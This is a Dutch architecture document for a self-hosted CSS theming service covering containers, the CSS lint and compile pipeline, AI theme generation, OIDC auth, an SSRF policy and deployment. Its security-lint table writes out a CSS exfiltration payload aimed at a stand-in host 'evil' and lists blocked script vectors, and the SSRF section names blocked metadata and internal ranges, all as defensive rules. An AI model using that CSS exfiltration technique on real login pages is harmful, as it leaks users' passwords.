# 02 — Technische architectuur

> Status: **goedgekeurd** · Versie 0.2 · 2026-10-05

## 1. Overzicht

```mermaid
flowchart LR
    subgraph Clients
        B[Browser beheerder<br/>React SPA]
        EU[Browsers eindgebruikers<br/>Proxmox, Nextcloud, …]
        EXT[Stylus / Userscript /<br/>browserextensie]
    end

    NPM[Nginx Proxy Manager<br/>TLS-terminatie<br/>+ sub_filter injectie]

    subgraph cssthema["cssthema (docker compose)"]
        NGX[nginx<br/>SPA statics · routing<br/>CSS microcache · rate limit]
        API[api<br/>FastAPI · uvicorn]
        WRK[worker<br/>arq · Playwright/Chromium<br/>crawler · screenshots · AI]
        PG[(PostgreSQL 16)]
        RDS[(Redis 7<br/>queue · sessions<br/>rate limits · pub/sub)]
        STO[(Object storage<br/>volume of S3/MinIO)]
        BKP[backup<br/>pg_dump + restic]
    end

    APPS[Doel-apps<br/>intern netwerk]
    AUTH[Authentik<br/>OIDC]
    AI[AI-provider<br/>Anthropic / OpenAI-compat / Ollama]

    B -->|https| NPM
    EU -->|https| NPM
    EXT -->|https| NPM
    NPM -->|cssthema.domain.be| NGX
    NPM -->|pve.domain.be …| APPS
    NGX -->|/api/*| API
    NGX -->|/*.css bij cache-miss| API
    API --> PG
    API --> RDS
    API --> STO
    WRK --> RDS
    WRK --> PG
    WRK --> STO
    WRK -->|crawl / render| APPS
    WRK -->|generatie| AI
    API -->|OIDC code flow| AUTH
    BKP --> PG
    BKP --> STO
```

### 1.1 Containers

| Container | Image (basis) | Verantwoordelijkheid | Schaal |
|---|---|---|---|
| `nginx` | `nginx:1.30-alpine` + gebouwde SPA | Serveert de React-build, routeert `/api` en CSS naar `api`, microcache voor CSS, gzip/brotli, security headers, rate limit op publieke endpoints | 1 (stateless, n mogelijk) |
| `api` | `python:3.12-slim` | REST API, OIDC, RBAC, CSS-compilatie, publieke CSS bij cache-miss, SSE voor job-events, Alembic-migraties bij start | n (stateless) |
| `worker` | `mcr.microsoft.com/playwright/python:v1.5x-noble` | Asynchrone jobs: snapshots, crawl/discovery, screenshots, AI, purge/retentie, gethemede screenshots | n (CPU/geheugen-zwaar) |
| `postgres` | `postgres:16-alpine` | Primaire data | 1 (later replica) |
| `redis` | `redis:7-alpine` | Jobqueue (arq), sessies, rate-limit-tellers, pub/sub voor job-events, cache-invalidatie | 1 |
| `backup` | `alpine` + `postgresql-client` + `restic` | Geplande backups | 1 |
| `minio` *(optioneel)* | `minio/minio` | S3-compatibele storage i.p.v. volume | 1 |

### 1.2 Waarom deze opdeling

- **API en worker zijn hetzelfde Python-pakket** (`cssthema`), met twee entrypoints. Gedeelde modellen en services, geen duplicatie, maar zware Playwright-afhankelijkheden zitten alleen in het worker-image.
- **Playwright nooit in het request-pad.** Renderen duurt seconden en kost honderden MB RAM. Alles wat een browser nodig heeft is een job.
- **Nginx vóór de API**, ook al zit NPM er nog vóór: NPM is van de beheerder en algemeen; de interne nginx is onderdeel van het product (cache, routing, headers) en dus reproduceerbaar mee-geleverd.

## 2. Architectuurbeslissingen (ADR-samenvatting)

| # | Beslissing | Alternatieven | Motivatie |
|---|---|---|---|
| ADR-01 | **Modulaire monoliet** (één backend-codebase, API + worker-proces) | Microservices | Eén beheerder, beperkte schaal; modulair opgezet zodat later afsplitsen kan. |
| ADR-02 | **SQLAlchemy 2.0 async + asyncpg**, Pydantic v2 | Sync SQLAlchemy | FastAPI is async; SSE en veel I/O-gebonden calls. |
| ADR-03 | **arq (Redis) als jobqueue** | Celery, RQ, Dramatiq | Native asyncio, licht, retries/cron ingebouwd, Redis is al nodig. |
| ADR-04 | **Gecompileerde CSS wordt bij publicatie opgeslagen** in `theme_versions.css_compiled` met SHA-256 | On-the-fly compileren | Publieke reads zijn simpele lookups; ETag is gratis; versies zijn echt onveranderlijk. |
| ADR-05 | **Rollback = nieuwe versie** met inhoud van de oude | Pointer terugzetten | Lineaire, auditbare historie; ETag verandert altijd mee; geen verwarring over "welke versie is live". |
| ADR-06 | **Preview tegen opgeslagen DOM-snapshot** in een gesandboxte iframe; live-proxy pas in productiefase | Alleen live-proxy | Werkt zonder login, zonder `X-Frame-Options`/CSP-problemen, reproduceerbaar, veilig (geen scripts). |
| ADR-07 | **Live save = autosave van draft**, publiceren is expliciet | Elke save publiceert | Halve CSS mag nooit live gaan op een loginpagina. |
| ADR-08 | **OIDC als BFF**: backend doet de code flow, browser krijgt alleen een httpOnly-sessiecookie | Tokens in de SPA | Geen tokens in JavaScript, eenvoudige CSRF-bescherming, sessie intrekbaar. |
| ADR-09 | **Object storage-abstractie** (filesystem standaard, S3 optioneel) | Blobs in PostgreSQL | DB blijft klein, backups sneller, screenshots goedkoop te serveren. |
| ADR-10 | **Paletten als design tokens** (`--ct-*`) die thema's kunnen delen | Alles per thema | Tientallen apps consistent restylen met één wijziging. |
| ADR-11 | **Same-origin injectie als standaardadvies** (NPM `location /__cssthema/` + `sub_filter`) | `<link>` naar `cssthema.domain.be` | Omzeilt CSP van apps als Nextcloud; geen CORS; zie [10-theme-injectie](10-theme-injectie.md). |
| ADR-12 | **AI-provider-abstractie met gestructureerde JSON-output + selector-validatie** | Vrije tekst-CSS | Betrouwbaar parsebaar, geen gehallucineerde selectors in productie-CSS. |
| ADR-13 | **Problem Details (RFC 9457)** voor alle API-fouten | Eigen formaat | Standaard, goed te typen in de frontend. |
| ADR-14 | **Frontend: Vite + React 19 + TS, TanStack Query, Zustand, Tailwind + eigen componenten** | Next.js, Redux, shadcn/ui | Pure SPA volstaat (geen SSR nodig), kleine bundle. De look volgt aiverslag (sinds 2026-10-05), daarom eigen componenten i.p.v. shadcn/ui. |
| ADR-15 | **API-client gegenereerd uit OpenAPI** (`openapi-typescript` + `openapi-fetch`) | Handgeschreven | Eén bron van waarheid voor schema's, compile-time fouten bij API-wijziging. |

## 3. Backend

### 3.1 Lagen

```mermaid
flowchart TB
    R[routers<br/>HTTP, auth-dependencies, schema's] --> S[services<br/>business logica, transacties]
    S --> RP[repositories<br/>SQLAlchemy queries]
    S --> D[domain<br/>css compiler, linter, dom analyzer,<br/>fingerprints, palettes]
    S --> I[integrations<br/>storage, npm client, ai providers,<br/>oidc, browser]
    S --> Q[jobs<br/>enqueue]
    W[worker tasks] --> S
    RP --> DB[(PostgreSQL)]
```

- **routers** bevatten geen logica; ze valideren, roepen een service aan en vertalen domeinfouten naar Problem Details.
- **domain** is puur (geen I/O) en daardoor goed unit-testbaar: CSS-compiler, linter, DOM-analyse op een HTML-string, fingerprinting.
- **integrations** zitten achter protocollen (`StorageBackend`, `AIProvider`, `BrowserPool`) zodat tests ze vervangen door fakes.

### 3.2 CSS-pijplijn

```mermaid
flowchart LR
    SRC[draft CSS<br/>bron] --> P[parse<br/>tinycss2]
    P --> L{lint}
    L -->|fouten| X[weigeren 422]
    L -->|ok/waarschuwingen| C[compile]
    PAL[palet tokens] --> C
    C --> H[header-comment<br/>slug · versie · hash]
    H --> M[minify]
    M --> HS[SHA-256 → ETag]
    HS --> V[(theme_versions)]
```

Compilatie-stappen:
1. Palet-tokens prependen als `:root{--ct-bg:#2e3440;…}` (alleen als er een palet gekoppeld is).
2. `/* @include partial:x */` vervangen (later, F-TM-11).
3. Header: `/*! cssthema · proxmox · v7 · 2026-10-05T12:00Z · sha256:ab12… */`.
4. Minify (whitespace/comments, behalve `/*!`).
5. Hash berekenen over het eindresultaat.

**Security-lint regels** (fout = publiceren geweigerd):

| Regel | Waarom |
|---|---|
| `@import` naar een host buiten de allowlist | Laadt onbekende CSS in gevoelige apps. |
| `url(...)` naar een externe host buiten de allowlist (`data:` en relatieve paden wel toegestaan) | CSS-exfiltratie: attribuutselectors + `background:url(https://evil/?c=a)` kunnen tekens van wachtwoordvelden lekken. |
| `expression(`, `behavior:`, `-moz-binding`, `javascript:` | Historische script-vectoren. |
| `</style` of `<` in de bron | Voorkomt uitbreken bij inline injectie. |
| Grootte > limiet | DoS en per ongeluk geplakte data-URI's. |

Allowlist standaard: de eigen host (`cssthema.domain.be`), `fonts.googleapis.com`, `fonts.gstatic.com`; configureerbaar door Admin.

### 3.3 Publieke CSS-levering

```mermaid
sequenceDiagram
    participant C as Browser / NPM
    participant N as nginx (cache)
    participant A as api
    participant R as Redis
    participant P as PostgreSQL

    C->>N: GET /proxmox.css (If-None-Match: "ab12")
    alt cache HIT (≤ 60 s oud)
        N-->>C: 304 of 200 uit cache
    else cache MISS
        N->>A: GET /proxmox.css (pad ongewijzigd doorgegeven)
        A->>R: GET css:proxmox (hash, versie, body)
        alt redis miss
            A->>P: SELECT published version
            A->>R: SET css:proxmox
        end
        A-->>N: 200 text/css, ETag, Cache-Control
        N-->>C: 200 (of 304 bij match)
    end
```

- Nginx: `proxy_cache_valid 200 60s; proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504; proxy_cache_lock on;` → backend-uitval heeft 24 u geen effect op reeds gecachede thema's.
- nginx geeft `/{slug}.css`, `/themes/{slug}.css` en `/themes/{slug}@{n}.css` ongewijzigd door aan de api.
- Bij elke wijziging van publieke CSS (publiceren, rollback, soft delete, herstel, hard delete, slug-wijziging) verwijdert de API `css:{slug}` uit Redis en vraagt hij best effort `http://nginx:8081/{slug}.css` en `/themes/{slug}.css` op. Die interne refresh-server (`proxy_cache_bypass`) overschrijft de cache-entry, ook met een 404. Open-source nginx kent geen purge; zie [spike S3](spikes/s3-css-cache.md). Met 60 s TTL is de vertraging ook zonder refresh begrensd.
- `@{n}`-URL's zijn onveranderlijk en worden 1 jaar gecachet.
- Response headers: `Content-Type: text/css; charset=utf-8`, `ETag: "sha256-ab12…"`, `Last-Modified`, `Cache-Control`, `Access-Control-Allow-Origin: *`, `X-Content-Type-Options: nosniff`, `X-Cssthema-Version: 7`.

### 3.4 Jobs

| Job | Trigger | Gemiddelde duur | Retries | Concurrency |
|---|---|---|---|---|
| `snapshot.capture` | URL-import, crawl | 5–30 s | 2 | 3 per worker |
| `snapshot.analyze` | Na capture / upload | < 2 s | 2 | 8 |
| `screenshot.capture` | Na snapshot, na publicatie (gethemed) | 3–10 s | 2 | 3 |
| `discovery.npm` / `discovery.urls` | Gebruiker, cron | minuten | 1 | 1 |
| `ai.generate` | Gebruiker | 20–90 s | 1 | 4 |
| `theme.health_check` | Na crawl | < 2 s per thema | 1 | 8 |
| `maintenance.retention` | Cron dagelijks | — | — | 1 |
| `maintenance.purge_deleted` | Cron dagelijks | — | — | 1 |

- Elke job heeft een rij in tabel `jobs` (status, voortgang, resultaat, fout) zodat de UI hem kan volgen, en publiceert events op Redis-kanaal `jobs:{id}` → API streamt via **SSE** (`GET /api/v1/jobs/{id}/events`).
- Idempotent: job-handlers controleren of het resultaat al bestaat (bv. snapshot met dezelfde job-id).
- Browser-pool: per worker één Chromium-instantie, nieuwe *context* per job (geïsoleerde cookies), max. 3 gelijktijdige pagina's, hard timeout 30 s per navigatie, 60 s per job.

### 3.5 DOM-capture en analyse

Capture (worker, Playwright):
1. `page.goto(url, wait_until="networkidle")`, extra wachttijd tot DOM 500 ms stabiel is (MutationObserver), max. 15 s.
2. In de pagina een script uitvoeren dat de DOM serialiseert **inclusief open shadow roots** (als `<template shadowrootmode="open">`, declaratieve Shadow DOM) zodat de preview ze correct rendert.
3. Alle stylesheets verzamelen (via `document.styleSheets` + netwerk-responses), assets (fonts/afbeeldingen) downloaden, URL's herschrijven naar `/api/v1/snapshots/{id}/assets/{hash}`.
4. `<script>`-tags verwijderen (de preview is statisch), event-attributen (`on*`) strippen.
5. HTML gzip'en en in storage opslaan; analyse in de database.

Analyse (pure functie, `domain/dom_analyzer`): `selectolax` (snelle HTML-parser) voor classes/IDs/structuur; `tinycss2` voor stylesheets en custom properties; heuristieken voor componenten (landmarks `header/nav/main/aside`, ARIA-rollen, veelvoorkomende class-patronen per framework: `x-panel`/`x-grid` voor ExtJS, `MuiButton` voor Material-UI, enz.). Per app-type kan een **fingerprint-plugin** (`domain/fingerprints/proxmox.py`) extra kennis leveren: bekende root-selectors, Shadow DOM-waarschuwingen, aanbevolen injectiemethode.

### 3.6 AI-generatie

```mermaid
flowchart LR
    S[snapshot-analyse] --> CMP[context builder<br/>componentboom, top-200 classes,<br/>css vars, kleurenpalet]
    SS[screenshots desktop] --> CMP
    PR[preset + palet + instructie] --> CMP
    CMP --> LLM[AIProvider<br/>structured JSON output]
    LLM --> VAL[validatie<br/>JSON-schema · CSS parse ·<br/>security-lint · selector-match]
    VAL --> REN[render CSS<br/>variables + overrides]
    REN --> GT[(generated_themes)]
```

- Context wordt begrensd (± 30k tokens): classes op frequentie, componentboom afgekapt op diepte 6, dubbele structuren samengevoegd.
- Output-schema: `{ "variables": {"--ct-bg": "#1e1e2e", …}, "overrides": [{"component": "sidebar", "selector": ".x-panel-header", "declarations": {"background": "var(--ct-surface)"}}], "notes": "…" }`. De **volledige CSS wordt door ons gerenderd** uit variables + overrides, niet door het model geschreven → altijd syntactisch geldig, consistent geformatteerd.
- Selector-validatie: elke selector wordt met `selectolax` op de snapshot-HTML uitgevoerd; 0 matches → gemarkeerd als `unmatched` en standaard weggelaten.
- Provider standaard Anthropic (model configureerbaar via `AI_MODEL`, bv. `claude-sonnet-5-5`); OpenAI-compatibel en Ollama via dezelfde interface. Zonder provider: deterministische palette mapping (F-AI-08).

### 3.7 Authenticatie en autorisatie

```mermaid
sequenceDiagram
    actor U as Gebruiker
    participant S as SPA
    participant A as api
    participant AK as Authentik

    U->>S: open cssthema.domain.be
    S->>A: GET /api/v1/auth/me
    A-->>S: 401
    S->>A: GET /api/v1/auth/login (redirect)
    A-->>U: 302 → Authentik (code + PKCE + state + nonce)
    U->>AK: inloggen (MFA via Authentik)
    AK-->>A: 302 /api/v1/auth/callback?code=…
    A->>AK: token exchange (client secret + verifier)
    A->>A: id_token valideren, groups → rol, user upsert
    A-->>U: Set-Cookie: cssthema_session (httpOnly, Secure, SameSite=Lax) → 302 /
    S->>A: GET /api/v1/auth/me (cookie)
    A-->>S: {user, role, permissions}
```

- Sessie in Redis (TTL 12 u sliding, absoluut max. 7 dagen), ID = 256-bit random.
- CSRF: double-submit token (`X-CSRF-Token` header verplicht bij muterende requests met sessiecookie). API-keys (header `Authorization: Bearer ct_…`) zijn niet CSRF-gevoelig.
- Rol wordt **bij elke login** opnieuw uit de groups-claim afgeleid (Authentik is bron van waarheid); Admin kan een lokale override zetten.
- API-key formaat: `ct_<8 tekens prefix>_<32 bytes base62>`; opgeslagen als SHA-256 van de geheime rest (hoge entropie, dus geen argon2 nodig) + prefix voor lookup.
- Autorisatie: FastAPI-dependency `require(Permission.THEMES_PUBLISH)`; permissies afgeleid uit rol ∩ key-scopes.
- Rate limiting:
  - nginx `limit_req` op publieke CSS: 50 r/s per IP, burst 100.
  - API: Redis sliding window per principal: 600 req/min algemeen, 30/min voor imports, 10/min voor AI, 5/u voor discovery.
- Audit: middleware + expliciete `audit.log()` in services; schrijft in dezelfde transactie als de wijziging (geen verlies bij rollback).

### 3.8 SSRF-beleid (importer/crawler)

Het product moet interne hosts bereiken — SSRF is hier een *feature* die begrensd moet worden:
- Alleen Editor/Admin kan URL's laten ophalen.
- Configureerbare allowlist (`FETCH_ALLOWED_HOSTS`, `FETCH_ALLOWED_CIDRS`, standaard: domeinen uit NPM + RFC 1918-ranges).
- Altijd geblokkeerd: `169.254.0.0/16` (cloud metadata), `127.0.0.0/8` en `::1` (de cssthema-host zelf), de interne compose-services (`postgres`, `redis`, `api`).
- DNS wordt één keer opgelost en het IP gecontroleerd; Playwright gebruikt een route-handler die elk request (ook subresources en redirects) opnieuw controleert.

## 4. Frontend

### 4.1 Stack

| Onderdeel | Keuze |
|---|---|
| Build | Vite 6, TypeScript strict |
| UI | React 19, Tailwind CSS 4, eigen componenten in aiverslag-stijl (alleen dark, monospace) |
| Routing | React Router 7 (data routers) |
| Server state | TanStack Query 5 (cache, optimistic updates) |
| Client state | Zustand (editor-tabs, layout, preview-instellingen) |
| Editor | `@monaco-editor/react`, Monaco CSS language service + eigen `CompletionItemProvider` voor snapshot-selectors en palet-tokens; `DiffEditor` voor versies |
| Formulieren | React Hook Form + Zod |
| API-client | `openapi-typescript` + `openapi-fetch`, gegenereerd uit `/api/v1/openapi.json` |
| Realtime | `EventSource` (SSE) voor jobs |
| Tests | Vitest + Testing Library; Playwright e2e |

### 4.2 Live preview-mechanisme

```mermaid
sequenceDiagram
    participant E as Monaco
    participant P as Preview-component
    participant F as iframe (sandbox)
    participant A as api

    P->>A: GET /snapshots/{id}/document
    A-->>P: gesaneerde HTML (zonder scripts, assets herschreven)
    P->>F: srcdoc = <meta CSP> + HTML + <style id="ct-live"></style> + inline bridge.js
    E->>P: onChange (CSS)
    P->>F: postMessage({type:"css", css}) (requestAnimationFrame-throttled)
    F->>F: ct-live.textContent = css (+ adoptedStyleSheets in shadow roots)
    F-->>P: postMessage({type:"click", selectorPath}) (inspector-modus)
```

- iframe attribuut `sandbox="allow-scripts"` **zonder** `allow-same-origin` → de snapshot draait in een opaque origin en kan niet bij cookies of de API.
- `bridge.js` is het enige script in de preview; het injecteert de CSS ook in alle open shadow roots (zodat het effect zichtbaar wordt dat een userscript zou hebben) — instelbaar "simuleer injectiemethode: link in head / userscript".
- De CSP reist mee in de srcdoc zelf, als eerste element in `<head>`: `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline' <api>/snapshots/; img-src data: <api>/snapshots/; font-src <api>/snapshots/; script-src 'sha256-<bridge>'">`. Een CSP-responseheader van `/snapshots/{id}/document` bereikt een srcdoc-document namelijk niet (dat erft de policy van de editorpagina). Het endpoint stuurt dezelfde header toch mee, voor wie de URL rechtstreeks opent.
- De preview-component haalt `/preview-bridge.js` één keer op (absolute URL) en zet de tekst **inline** in de srcdoc, zodat de hash in `script-src` klopt. Geen `<script src>`: in een srcdoc wordt een relatieve URL opgelost tegen de editor-route en komt hij in de SPA-fallback terecht.

## 5. Data en opslag

- **PostgreSQL**: alle metadata, CSS-bron en gecompileerde CSS (klein: KB's), analyse-resultaten (JSONB), audit. Zie [03-database-ontwerp](03-database-ontwerp.md).
- **Object storage** (`storage/` volume of S3): snapshot-HTML (gzip), snapshot-assets (content-addressed op SHA-256, dus gedeeld tussen snapshots), screenshots, export-bundels. Sleutelstructuur:

```
snapshots/{snapshot_id}/document.html.gz
assets/{sha256[0:2]}/{sha256}            # content-addressed
screenshots/{service_id}/{screenshot_id}.webp
screenshots/{service_id}/{screenshot_id}.thumb.webp
exports/{job_id}/{slug}.cssthema.zip     # tijdelijk, 24 u
```

- **Redis**: vluchtig; verlies = uitgelogd + lopende jobs opnieuw starten. Geen backup nodig.

## 6. Configuratie

Alles via omgevingsvariabelen (12-factor), gevalideerd met `pydantic-settings`. Belangrijkste:

| Variabele | Voorbeeld | Doel |
|---|---|---|
| `PUBLIC_BASE_URL` | `https://cssthema.domain.be` | Absolute URL's in snippets en UserCSS |
| `POSTGRES_HOST` / `POSTGRES_USER` / `POSTGRES_PASSWORD` / `POSTGRES_DB` | `postgres` / `cssthema` / *** / `cssthema` | De api bouwt hier de database-URL uit (wachtwoord URL-gecodeerd) |
| `DATABASE_URL` | `postgresql+asyncpg://cssthema:***@postgres/cssthema` | Optioneel: overschrijft de `POSTGRES_*`-delen |
| `TRUSTED_PROXIES` | `172.16.0.0/12,192.168.1.10` | nginx: bronnen waarvan `X-Forwarded-For` vertrouwd wordt (NPM); alleen zij (en nginx' eigen machine) mogen via `/api/` schrijven |
| `REDIS_URL` | `redis://redis:6379/0` | |
| `SECRET_KEY` | 64 random bytes | Sessies, CSRF |
| `ENCRYPTION_KEY` | Fernet-key | Versleuteling van geheimen in DB |
| `OIDC_ISSUER` | `https://auth.domain.be/application/o/cssthema/` | Authentik |
| `OIDC_CLIENT_ID` / `OIDC_CLIENT_SECRET` | | |
| `OIDC_ROLE_MAPPING` | `cssthema-admins:admin,cssthema-editors:editor,cssthema-viewers:viewer` | |
| `BREAK_GLASS_ADMIN_PASSWORD_HASH` | argon2-hash of leeg | Noodaccount |
| `STORAGE_BACKEND` | `filesystem` / `s3` | |
| `AI_PROVIDER` / `AI_MODEL` / `AI_API_KEY` | `anthropic` / `claude-sonnet-5-5` | Ook via UI-instellingen (versleuteld) |
| `FETCH_ALLOWED_CIDRS` | `10.0.0.0/8,192.168.0.0/16` | SSRF-allowlist |
| `CSS_URL_ALLOWLIST` | `fonts.googleapis.com,fonts.gstatic.com` (standaard) | Security-lint: hosts die `url()`/`@import` mogen gebruiken; de host van `PUBLIC_BASE_URL` mag altijd |
| `CSS_MAX_BYTES` | `524288` (standaard, 512 KB) | Maximale grootte van de CSS van één thema (draft, import, publicatie) |
| `CSS_REFRESH_URL` | `http://127.0.0.1:8081` (standaard); compose: `http://nginx:8081` | Interne refresh-server van nginx, aangeroepen na elke wijziging van publieke CSS (spike S3); leeg = niet verversen |
| `CSS_FILES_DIR` | `/var/lib/cssthema/css-files` (standaard) | Handgemaakte CSS die nginx vóór de api serveert; bron voor *lokale bestanden importeren* (na import gearchiveerd in `.geimporteerd/`) |
| `CSS_FILES_HOST_DIR` | `../../css-files` (standaard, t.o.v. `docker/compose/`) | Alleen Docker: hostmap die compose in `nginx` (alleen-lezen) én `api` op `/var/lib/cssthema/css-files` mount, zodat beide dezelfde handgemaakte bestanden zien; uid 10001 moet erin kunnen schrijven (archiveren) |

## 7. Deployment

### 7.1 Docker Compose (standaard)

- Netwerken: `edge` (alleen `nginx`, gekoppeld aan het NPM-netwerk of een gepubliceerde poort; alias `cssthema-nginx`), `internal` (alle services, `internal: true`) en `egress` voor de twee services die naar buiten moeten: `worker` (crawls, AI) en `api` (OIDC-discovery, JWKS en token-uitwisseling met Authentik).
- Volumes: `pgdata`, `storage`, `backups`, en de hostmap met handgemaakte CSS (`CSS_FILES_HOST_DIR`) in `nginx` en `api`.
- Healthchecks op elke service; `api` start pas als `postgres` healthy is; migraties met PostgreSQL advisory lock zodat meerdere api-replica's niet tegelijk migreren.
- Resource limits: worker 2 GB RAM / 2 CPU (Chromium), api 512 MB, nginx 128 MB.
- De uitwerking staat in `docker/compose/docker-compose.yml` (fase 0).

### 7.2 Kubernetes (optioneel, productiefase)

Kustomize base + overlays: Deployments voor nginx/api/worker (HPA op CPU voor api en op queue-lengte voor worker via KEDA), PostgreSQL via CloudNativePG of extern, Redis als StatefulSet, storage via PVC (RWX) of S3, Ingress met cert-manager, CronJob voor backups.

### 7.3 Backups

| Wat | Hoe | Frequentie | Retentie |
|---|---|---|---|
| PostgreSQL | `pg_dump -Fc` → `backups/` → restic naar extern doel (NAS, S3, B2) | Dagelijks 03:00 | 7 d / 4 w / 6 m |
| Storage | restic (incrementeel, gededupliceerd) | Dagelijks | idem |
| Configuratie | `.env` buiten backup-doel bewaren (bevat sleutels) | — | — |
| Restore-test | `scripts/restore-test.sh` in tijdelijke compose-stack | Maandelijks (cron) | — |

**Belangrijk:** zonder `ENCRYPTION_KEY` zijn de versleutelde geheimen in een backup onbruikbaar; de key moet apart bewaard worden (password manager).

## 8. Observability

- Logs: `structlog` JSON naar stdout met `request_id`, `user_id`, `job_id`; nginx access log in JSON.
- Metrics (`/metrics`, alleen intern): request-latency per route, CSS-hits per slug, cache hit-ratio, job-duur/fouten per type, AI-tokens/kosten, Playwright-poolgebruik.
- Traces: OpenTelemetry (optioneel, OTLP-endpoint via env).
- Kant-en-klaar Grafana-dashboard in `docs/ops/` (productiefase) — passend, want Grafana staat toch al in het homelab.

## 9. Teststrategie

| Niveau | Tools | Focus |
|---|---|---|
| Unit | pytest, Vitest | CSS-compiler, linter, DOM-analyzer (fixtures met echte HTML van elke doel-app), fingerprints, RBAC-matrix |
| Integratie | pytest + testcontainers (PostgreSQL, Redis) | Repositories, migraties up/down, API-endpoints met echte DB |
| Contract | Schemathesis op OpenAPI | Elke endpoint tegen zijn schema |
| E2E | Playwright | Kernflows: login (mock OIDC), thema maken → publiceren → `/slug.css` ophalen, rollback |
| Security | bandit, pip-audit, npm audit, Trivy op images, ZAP baseline | |
| Performance | k6 op `/slug.css` | NF-01 |
